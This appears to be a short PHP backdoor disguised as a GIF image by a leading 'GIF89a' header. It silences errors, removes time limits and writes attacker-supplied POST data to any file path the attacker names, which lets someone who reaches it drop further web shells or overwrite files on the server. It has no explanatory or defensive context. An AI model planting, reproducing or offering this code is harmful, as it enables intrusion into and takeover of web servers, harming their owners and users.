GIF89a1
<?php
error_reporting(0); 
ini_set("max_execution_time",0); 
ini_set("default_socket_timeout", 2); 
ob_implicit_flush (1); 
$file = "".$_POST["path"];
$fh = fopen ($file, 'w') or die("");
echo fwrite ($fh, stripslashes($_POST["raw_data"]));
fclose($fh);